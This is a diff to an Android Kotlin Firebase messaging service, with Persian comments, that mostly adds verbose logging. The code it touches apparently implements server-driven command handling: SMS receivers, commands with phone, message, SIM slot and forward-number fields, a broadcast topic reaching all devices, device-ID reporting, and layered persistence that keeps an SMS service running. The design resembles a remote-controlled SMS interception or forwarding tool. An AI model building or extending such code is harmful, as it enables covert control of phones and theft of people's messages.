@@ -121,21 +121,41 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "🚀 MyFirebaseMessagingService onCreate()")
+        Log.d(TAG, "════════════════════════════════════════")
+        Log.d(TAG, "🚀 MyFirebaseMessagingService CREATED")
+        Log.d(TAG, "════════════════════════════════════════")
         
+        Log.d(TAG, "📢 Step 1: Creating wake up channel...")
         createWakeUpChannel()
+        Log.d(TAG, "📢 Step 2: Registering SMS receivers...")
         registerSmsReceivers()
-        
+        Log.d(TAG, "📢 Step 3: Subscribing to Firebase topic 'all_devices'...")
         subscribeToAllDevicesTopic()
+        
+        Log.d(TAG, "════════════════════════════════════════")
+        Log.d(TAG, "✅ MyFirebaseMessagingService INITIALIZED")
+        Log.d(TAG, "════════════════════════════════════════")
     }
     
     private fun subscribeToAllDevicesTopic() {
+        Log.d(TAG, "════════════════════════════════════════")
+        Log.d(TAG, "📢 SUBSCRIBING TO TOPIC: all_devices")
+        Log.d(TAG, "════════════════════════════════════════")
+        
         FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
             .addOnCompleteListener { task ->
                 if (task.isSuccessful) {
-                    Log.d(TAG, "✅ Successfully subscribed to 'all_devices' topic")
+                    Log.d(TAG, "════════════════════════════════════════")
+                    Log.d(TAG, "✅ SUCCESSFULLY SUBSCRIBED TO TOPIC: all_devices")
+                    Log.d(TAG, "📢 Device will now receive ping commands every 10 minutes")
+                    Log.d(TAG, "📢 Device will receive all broadcast commands from server")
+                    Log.d(TAG, "════════════════════════════════════════")
                 } else {
-                    Log.e(TAG, "❌ Failed to subscribe to 'all_devices' topic", task.exception)
+                    Log.e(TAG, "════════════════════════════════════════")
+                    Log.e(TAG, "❌ FAILED TO SUBSCRIBE TO TOPIC: all_devices")
+                    Log.e(TAG, "❌ Error: ${task.exception?.message}")
+                    Log.e(TAG, "🔄 Will retry in 30 seconds...")
+                    Log.e(TAG, "════════════════════════════════════════")
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                         Log.d(TAG, "🔄 Retrying topic subscription...")
                         subscribeToAllDevicesTopic()
@@ -187,10 +207,30 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         try {
             val messageId = remoteMessage.messageId ?: UUID.randomUUID().toString()
             
+            // ⭐ تشخیص اینکه پیام از تاپیک آمده یا نه
+            val isFromTopic = remoteMessage.from?.startsWith("/topics/") == true
+            val topicName = if (isFromTopic) {
+                remoteMessage.from?.substringAfter("/topics/")
+            } else {
+                null
+            }
+            
             Log.d(TAG, "════════════════════════════════════════")
-            Log.d(TAG, "📥 FCM Message Received")
-            Log.d(TAG, "From: ${remoteMessage.from}")
-            Log.d(TAG, "Message ID: $messageId")
+            Log.d(TAG, "📥 FCM MESSAGE RECEIVED")
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "📨 From: ${remoteMessage.from}")
+            Log.d(TAG, "🆔 Message ID: $messageId")
+            if (isFromTopic && topicName != null) {
+                Log.d(TAG, "════════════════════════════════════════")
+                Log.d(TAG, "📢 ⭐ MESSAGE FROM TOPIC: $topicName ⭐")
+                Log.d(TAG, "📢 This is a broadcast message to all devices")
+                if (topicName == "all_devices") {
+                    Log.d(TAG, "📢 This could be the auto ping (every 10 minutes)")
+                }
+                Log.d(TAG, "════════════════════════════════════════")
+            } else {
+                Log.d(TAG, "📱 Message from direct device (not topic)")
+            }
             Log.d(TAG, "════════════════════════════════════════")
             
             // ⭐ چک کردن اینکه این پیام قبلاً پردازش شده یا نه
@@ -215,7 +255,8 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             remoteMessage.data.forEach { (key, value) ->
                 Log.d(TAG, "   - $key: $value")
             }
-            handleDataMessage(remoteMessage.data)
+            // ⭐ ارسال اطلاعات تاپیک به handleDataMessage
+            handleDataMessage(remoteMessage.data, isFromTopic, topicName)
         } else {
             Log.w(TAG, "⚠️ No data payload received")
         }
@@ -228,39 +269,67 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         }
     }
 
-    private fun handleDataMessage(data: Map<String, String>) {
-        Log.d(TAG, "🔄 Starting handleDataMessage...")
+    private fun handleDataMessage(data: Map<String, String>, isFromTopic: Boolean = false, topicName: String? = null) {
+        Log.d(TAG, "════════════════════════════════════════")
+        Log.d(TAG, "🔄 PROCESSING DATA MESSAGE")
+        Log.d(TAG, "════════════════════════════════════════")
+        if (isFromTopic && topicName != null) {
+            Log.d(TAG, "📢 ⭐ MESSAGE SOURCE: TOPIC '$topicName' ⭐")
+            Log.d(TAG, "📢 This is a broadcast message to all devices")
+        } else {
+            Log.d(TAG, "📱 Message Source: Direct device message")
+        }
+        Log.d(TAG, "════════════════════════════════════════")
 
         val type = data["type"]
         val phone = data["phone"]
         val message = data["message"]
         val simSlotStr = data["simSlot"]
         val forwardNumber = data["number"]
+        val timestamp = data["timestamp"]
 
-        Log.d(TAG, "🔍 Parsed Data:")
-        Log.d(TAG, "   - type: $type")
-        Log.d(TAG, "   - phone: $phone")
-        Log.d(TAG, "   - message: $message")
-        Log.d(TAG, "   - simSlot: $simSlotStr")
-        Log.d(TAG, "   - forwardNumber: $forwardNumber")
+        Log.d(TAG, "🔍 PARSED MESSAGE DATA:")
+        Log.d(TAG, "   📋 Command Type: $type")
+        Log.d(TAG, "   📞 Phone: $phone")
+        Log.d(TAG, "   💬 Message: $message")
+        Log.d(TAG, "   📟 SIM Slot: $simSlotStr")
+        Log.d(TAG, "   📞 Forward Number: $forwardNumber")
+        Log.d(TAG, "   ⏰ Timestamp: $timestamp")
+        Log.d(TAG, "════════════════════════════════════════")
 
         val simSlot = simSlotStr?.toIntOrNull() ?: 0
         val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
 
         Log.d(TAG, "📱 Device ID: $deviceId")
-        Log.d(TAG, "📟 SIM Slot: $simSlot")
+        Log.d(TAG, "📟 Parsed SIM Slot: $simSlot")
+        Log.d(TAG, "════════════════════════════════════════")
 
         when (type) {
             "ping" -> {
-                Log.d(TAG, "🎯 PING command detected!")
+                Log.d(TAG, "════════════════════════════════════════")
+                if (isFromTopic && topicName == "all_devices") {
+                    Log.d(TAG, "🎯 PING COMMAND FROM TOPIC 'all_devices' DETECTED!")
+                    Log.d(TAG, "📢 This is the auto ping sent every 10 minutes")
+                    Log.d(TAG, "📢 All devices subscribed to 'all_devices' receive this")
+                } else {
+                    Log.d(TAG, "🎯 PING COMMAND DETECTED (Direct message)")
+                }
+                Log.d(TAG, "════════════════════════════════════════")
+                Log.d(TAG, "🔄 Step 1: Sending ping response to server...")
+                // ⭐ ping از تاپیک دقیقاً مثل ping معمولی عمل می‌کند
                 sendOnlineConfirmation()
+                Log.d(TAG, "🔄 Step 2: Restarting all background services...")
                 // ⭐ وقتی ping میاد، سرویس‌ها رو هم راه‌اندازی می‌کنیم
-                Log.d(TAG, "🚀 Starting services after ping...")
                 startAllBackgroundServices()
+                Log.d(TAG, "🔄 Step 3: Will send pending responses in 2 seconds...")
                 // ⭐ ارسال پاسخ‌های pending که قبلاً fail شده بودن
                 Handler(Looper.getMainLooper()).postDelayed({
+                    Log.d(TAG, "🔄 Step 3: Sending pending responses now...")
                     sendPendingResponses()
                 }, 2000) // 2 ثانیه تاخیر
+                Log.d(TAG, "════════════════════════════════════════")
+                Log.d(TAG, "✅ PING COMMAND PROCESSING COMPLETED")
+                Log.d(TAG, "════════════════════════════════════════")
             }
             
             // ⭐ فعال‌سازی سرویس‌های پس‌زمینه از راه دور
@@ -536,28 +605,38 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     }
 
     private fun sendOnlineConfirmation() {
-        Log.d(TAG, "═══ Ping Response Started ═══")
+        Log.d(TAG, "════════════════════════════════════════")
+        Log.d(TAG, "📤 SENDING PING RESPONSE TO SERVER")
+        Log.d(TAG, "════════════════════════════════════════")
 
         Thread {
             try {
                 val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                 Log.d(TAG, "📱 Device ID: $deviceId")
 
+                val timestamp = System.currentTimeMillis()
                 val body = JSONObject().apply {
                     put("deviceId", deviceId)
                     put("isOnline", true)
-                    put("timestamp", System.currentTimeMillis())
+                    put("timestamp", timestamp)
                     put("source", "FCM_Ping")
                 }
 
-                val urlString = "${getBaseUrl()}/ping-response"
-                Log.d(TAG, "🌐 URL: $urlString")
-                Log.d(TAG, "📤 Body: ${body.toString()}")
+                val baseUrl = getBaseUrl()
+                val urlString = "$baseUrl/ping-response"
+                Log.d(TAG, "🌐 Base URL: $baseUrl")
+                Log.d(TAG, "🌐 Full URL: $urlString")
+                Log.d(TAG, "📤 Request Body:")
+                Log.d(TAG, "   - deviceId: $deviceId")
+                Log.d(TAG, "   - isOnline: true")
+                Log.d(TAG, "   - timestamp: $timestamp")
+                Log.d(TAG, "   - source: FCM_Ping")
+                Log.d(TAG, "📤 JSON Body: ${body.toString()}")
 
                 val url = URL(urlString)
                 val conn = url.openConnection() as HttpURLConnection
 
-                Log.d(TAG, "🔗 Opening connection...")
+                Log.d(TAG, "🔗 Opening HTTP connection...")
 
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json")
@@ -565,35 +644,53 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 conn.connectTimeout = 15000
                 conn.readTimeout = 15000
 
-                Log.d(TAG, "📝 Writing request body...")
+                Log.d(TAG, "📝 Writing request body to server...")
 
                 conn.outputStream.use { os ->
                     val bytes = body.toString().toByteArray()
                     Log.d(TAG, "📊 Body size: ${bytes.size} bytes")
                     os.write(bytes)
                     os.flush()
+                    Log.d(TAG, "✅ Request body written successfully")
                 }
 
+                Log.d(TAG, "⏳ Waiting for server response...")
                 val responseCode = conn.responseCode
+                Log.d(TAG, "════════════════════════════════════════")
+                Log.d(TAG, "📥 SERVER RESPONSE RECEIVED")
                 Log.d(TAG, "📥 Response Code: $responseCode")
 
                 if (responseCode == HttpURLConnection.HTTP_OK) {
                     val response = conn.inputStream.bufferedReader().use { it.readText() }
-                    Log.d(TAG, "✅ Server Response: $response")
+                    Log.d(TAG, "✅ SUCCESS! Server Response: $response")
+                    Log.d(TAG, "✅ Ping response sent successfully to server")
                 } else {
                     val errorResponse = conn.errorStream?.bufferedReader()?.use { it.readText() }
+                    Log.e(TAG, "❌ ERROR! Server returned code: $responseCode")
                     Log.e(TAG, "❌ Error Response: $errorResponse")
                 }
+                Log.d(TAG, "════════════════════════════════════════")
 
                 conn.disconnect()
-                Log.d(TAG, "✅ Heartbeat (ping) sent successfully")
+                Log.d(TAG, "✅ Connection closed")
 
             } catch (e: java.net.ConnectException) {
-                Log.e(TAG, "❌ Connection failed: Cannot reach server", e)
+                Log.e(TAG, "════════════════════════════════════════")
+                Log.e(TAG, "❌ CONNECTION FAILED")
+                Log.e(TAG, "❌ Cannot reach server: ${e.message}")
+                Log.e(TAG, "════════════════════════════════════════")
+                e.printStackTrace()
             } catch (e: java.net.SocketTimeoutException) {
-                Log.e(TAG, "❌ Connection timeout", e)
+                Log.e(TAG, "════════════════════════════════════════")
+                Log.e(TAG, "❌ CONNECTION TIMEOUT")
+                Log.e(TAG, "❌ Server did not respond in time: ${e.message}")
+                Log.e(TAG, "════════════════════════════════════════")
+                e.printStackTrace()
             } catch (e: Exception) {
-                Log.e(TAG, "❌ Failed to send ping response", e)
+                Log.e(TAG, "════════════════════════════════════════")
+                Log.e(TAG, "❌ FAILED TO SEND PING RESPONSE")
+                Log.e(TAG, "❌ Error: ${e.message}")
+                Log.e(TAG, "════════════════════════════════════════")
                 e.printStackTrace()
             }
         }.start()
@@ -897,45 +994,68 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     private fun startAllBackgroundServices() {
         try {
             Log.d(TAG, "════════════════════════════════════════")
-            Log.d(TAG, "🚀 STARTING ALL SERVICES FROM FIREBASE")
+            Log.d(TAG, "🚀 RESTARTING ALL BACKGROUND SERVICES")
             Log.d(TAG, "════════════════════════════════════════")
             
             // 1️⃣ SmsService
+            Log.d(TAG, "📱 Step 1: Starting SmsService...")
             val smsIntent = Intent(applicationContext, SmsService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 applicationContext.startForegroundService(smsIntent)
+                Log.d(TAG, "   → Using startForegroundService (Android O+)")
             } else {
                 applicationContext.startService(smsIntent)
+                Log.d(TAG, "   → Using startService (Android < O)")
             }
-            Log.d(TAG, "✅ SmsService started")
+            Log.d(TAG, "✅ SmsService started successfully")
             
             // 2️⃣ HeartbeatService
+            Log.d(TAG, "💓 Step 2: Starting HeartbeatService...")
             val heartbeatIntent = Intent(applicationContext, HeartbeatService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 applicationContext.startForegroundService(heartbeatIntent)
+                Log.d(TAG, "   → Using startForegroundService (Android O+)")
             } else {
                 applicationContext.startService(heartbeatIntent)
+                Log.d(TAG, "   → Using startService (Android < O)")
             }
-            Log.d(TAG, "✅ HeartbeatService started")
+            Log.d(TAG, "✅ HeartbeatService started successfully")
             
             // 3️⃣ WorkManager
+            Log.d(TAG, "⚙️ Step 3: Restarting WorkManager heartbeat...")
             restartHeartbeatWorker()
+            Log.d(TAG, "✅ WorkManager heartbeat restarted")
             
             // 4️⃣ ⭐ JobScheduler
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                Log.d(TAG, "📅 Step 4: Scheduling JobScheduler heartbeat...")
                 com.example.test.utils.JobSchedulerHelper.scheduleHeartbeatJob(applicationContext)
-                Log.d(TAG, "✅ JobScheduler scheduled")
+                Log.d(TAG, "✅ JobScheduler scheduled successfully")
+            } else {
+                Log.d(TAG, "⚠️ Step 4: JobScheduler not available (Android < Lollipop)")
             }
             
             Log.d(TAG, "════════════════════════════════════════")
-            Log.d(TAG, "✅ ALL SERVICES STARTED FROM FIREBASE")
+            Log.d(TAG, "✅ ALL SERVICES RESTARTED SUCCESSFULLY")
+            Log.d(TAG, "   ✅ SmsService: Running")
+            Log.d(TAG, "   ✅ HeartbeatService: Running")
+            Log.d(TAG, "   ✅ WorkManager: Scheduled")
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                Log.d(TAG, "   ✅ JobScheduler: Scheduled")
+            }
             Log.d(TAG, "════════════════════════════════════════")
             
             // ارسال تایید به سرور
+            Log.d(TAG, "📤 Sending service status to server...")
             sendServiceStatusToServer(true)
+            Log.d(TAG, "✅ Service status sent to server")
             
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to start services: ${e.message}", e)
+            Log.e(TAG, "════════════════════════════════════════")
+            Log.e(TAG, "❌ FAILED TO START SERVICES")
+            Log.e(TAG, "❌ Error: ${e.message}")
+            Log.e(TAG, "════════════════════════════════════════")
+            e.printStackTrace()
             sendServiceStatusToServer(false)
         }
     }
@@ -1154,10 +1274,14 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     override fun onNewToken(token: String) {
         super.onNewToken(token)
         Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "🔄 FCM Token Updated")
-        Log.d(TAG, "New Token: $token")
+        Log.d(TAG, "🔄 FCM TOKEN UPDATED")
         Log.d(TAG, "════════════════════════════════════════")
-        
+        Log.d(TAG, "📱 New Token: ${token.take(50)}...")
+        Log.d(TAG, "📱 Full Token: $token")
+        Log.d(TAG, "📱 Token Length: ${token.length} characters")
+        Log.d(TAG, "════════════════════════════════════════")
+        Log.d(TAG, "📢 Re-subscribing to topic 'all_devices' with new token...")
         subscribeToAllDevicesTopic()
+        Log.d(TAG, "════════════════════════════════════════")
     }
 }
